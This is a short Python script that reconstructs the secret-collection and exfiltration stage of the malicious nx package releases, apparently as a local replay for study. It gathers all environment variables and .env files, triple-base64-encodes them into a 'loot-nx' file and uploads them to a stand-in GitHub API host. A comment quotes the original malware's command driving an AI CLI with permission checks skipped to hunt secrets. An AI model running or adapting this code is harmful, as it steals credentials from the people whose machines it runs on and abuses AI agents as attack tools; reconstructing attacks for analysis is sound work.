# Reconstruction of the collection and exfiltration steps of the malicious nx
# releases (August 2025): inventory environment variables and .env files, ask
# a local AI CLI to find more, encode the haul three times with base64, and
# upload it as a file through a GitHub-style API. No propagation; local only.
import base64, glob, json, os, socket, ssl, subprocess
cfg = json.load(open("replay.json"))
haul = {"env": dict(os.environ), "dotenv": {}}
for path in glob.glob("**/.env*", recursive=True):
    haul["dotenv"][path] = open(path, errors="replace").read()
# The real thing ran `claude --dangerously-skip-permissions -p "<inventory prompt>"`.
haul["ai"] = subprocess.run(["sh", "-c", "env"], capture_output=True, text=True).stdout
blob = json.dumps(haul).encode()
for _ in range(3):
    blob = base64.b64encode(blob)
open("loot-nx", "wb").write(blob)
body = json.dumps({"message": "results", "content": blob.decode()}).encode()
name = "api.github.test"
ctx = ssl.create_default_context(cafile=cfg["ca"])
try:
    with ctx.wrap_socket(socket.create_connection(("127.0.0.1", cfg["ports"][name])), server_hostname=name) as s:
        s.sendall(b"PUT /repos/victim/s1ngularity-repository/contents/results.b64 HTTP/1.1\r\nHost: api.github.test\r\nContent-Length: %d\r\nConnection: close\r\n\r\n" % len(body) + body)
        s.recv(100)
    print("exfil sent")
except OSError as e:
    print("exfil refused", type(e).__name__)
